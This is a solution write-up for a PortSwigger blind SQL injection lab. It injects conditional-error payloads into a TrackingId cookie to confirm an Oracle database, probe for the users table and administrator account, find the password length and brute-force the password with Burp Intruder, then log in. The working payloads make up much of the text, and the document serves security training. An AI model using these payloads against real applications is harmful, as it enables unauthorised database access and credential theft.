Lab Description:

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/37527be6-80ad-4666-a684-48c33534c655)

Solutions:

Request looks like this

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/5dcb68ed-962f-4def-904a-27f9f05d73f0)

Query looks like the following

```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'```

1. Inducing error message -
Add an extra ' symbol. We see that error appears because of incorrect ssql syntax

SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/2d545cc2-7f76-46f2-bedf-f62420fb5742)

Add 2 extra ' symbol, we get a response back which indicates that the sql syntax is correct ('' indicates opening and closing of query & hence correct sql query)

```SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'''```

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/a9b7b8b8-02da-4003-b850-64a7bc87a4d5)



2. Conform the reason for error is invalid SQL query -
To do this, you first need to construct a subquery using valid SQL syntax. Try submitting: TrackingId=xyz'||(SELECT '')||'

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/ab608f5d-e6ce-4e39-880e-815c114a0fda)

In this case, notice that the query still appears to be invalid. This may be because the database used here is ORACLE & for that we need to specify a table called DUAL. Hence we got this error.

Try specifying a predictable table name in the query: TrackingId=xyz'||(SELECT '' FROM dual)||'

We get a response without any error , we can confrom that it is an ORACLE database which requires all SELECT statements to explicitly specify a table name.

To conform this we can give an invalid query by specifying some random table TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'


![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/cc43a955-1177-4575-85fc-a85553f4f895)

Verify users table exist -
We can verify whether users table exist or not by the following command TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/82fecc78-42e1-46ae-941a-ac6140dcf542)

No error -> implies that users table exist.

NOTE - Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break > our concatenation.

Checking whether administrator user is present in db -
We can exploit this error inducing queries to test if admin user is present or not

1.Set (1=1) ie. Condition is TRUE - TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/ef758f56-784b-4ece-8749-b7c6adff0e0e)

We receive an error. means the condition is TRUE so it threw an divide by 0 error

Set (1=2) ie. Condition is FALSE - TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/21df0662-c1e1-4689-b2e4-cd29f63d776b)

We get a 200 response , means the condition failed and hence it returned nothing !

NOTE- This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true.

We can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:
```TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'```

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/a17abb93-8465-4dab-b499-7e4b0abc6651)

It shows an error which means there is indeed a user called administrator

Determine the length of admin's password -

```TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'```

RESPONSE -

ERROR -> Condition is TRUE
NUlll response -> Condition is FALSE
The length of password will be definitly > 1 , so we get an error.

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/73877b8a-a735-439f-8dd1-c6fd091114c7)
AUTOMATE THIS by Burp Intruder , by adding password length (LENGTH>1) as payload .

From req 20, we get an error where condition is (LENGTH > 20)

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/60b529bb-aedd-4945-80ee-15bf540b586b)

Bruteforce the admin's password -
```TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,$1$,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'```


Add the length of password & each letter to be bruteforced as payloads.

ATTACK TYPE - CLUSTER BOMB Payload 1 - Numbers Payload 2 - Bruteforcer

We get the 20 responses which returned a error.

Thus we got the admin's password - 61icvpfoshqibwec7loe

Now we can log in as administrator ,

![image](https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/cb4c6fd4-07c7-4740-9517-b50000438728)
